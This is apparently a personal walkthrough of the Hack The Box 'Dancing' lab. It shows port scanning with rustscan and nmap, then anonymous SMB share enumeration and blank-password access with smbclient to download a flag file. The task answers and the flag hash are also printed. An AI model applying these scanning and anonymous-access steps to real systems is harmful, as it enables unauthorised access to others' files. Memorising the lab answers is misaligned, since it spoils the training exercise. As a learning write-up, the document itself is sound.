- - - 
created : 30-07-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file on HTB, go in the same directory on my PC and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

What does the 3-letter acronym SMB stand for?

```bash
 Server Message Block
```
# Task 2

What port does SMB use to operate at?

```bash
 445
```
# Task 3

What is the service name for port 445 that came up in our Nmap scan?
## Rustscan/Nmap

We can use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Dancing]
└─$ rustscan -a dancing.htb -- -A  

Open 10.129.69.166:135
Open 10.129.69.166:139
Open 10.129.69.166:445
Open 10.129.69.166:5985
Open 10.129.69.166:47001
Open 10.129.69.166:49664
Open 10.129.69.166:49665
Open 10.129.69.166:49666
Open 10.129.69.166:49668
Open 10.129.69.166:49667
Open 10.129.69.166:49669

PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

The answer is **microsoft-ds**.
# Task 4

What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

```bash
 -L
```
# Task 5

How many shares are there on Dancing?
## SMBclient

Let's check, we can use [SMBclient](../../../../3%20-%20Tags/Hacking%20Tools/SMBclient.md) to connect :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Dancing]
└─$ smbclient -L 10.129.69.166
Password for [WORKGROUP\mdn0x]: (no passwd/enter)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.69.166 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
# Task 6

What is the name of the share we are able to access in the end with a blank password?

```bash
 WorkShares
```
# Task 7

What is the command we can use within the SMB shell to download the files we find? `get`

Let's use the `-N` flag to access the directory like this :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Dancing]
└─$ smbclient  //10.129.69.166/WorkShares -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

                5114111 blocks of size 4096. 1753002 blocks available
```

Now we can download the files with **get** :

```bash
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

                5114111 blocks of size 4096. 1752981 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
```
# Submit Flag

Submit root flag

Now we exit with `quit` or `ctrl + C` and `cat` the flag :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Dancing]
└─$ ls
flag.txt  worknotes.txt
                                      
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Dancing]
└─$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664 
```
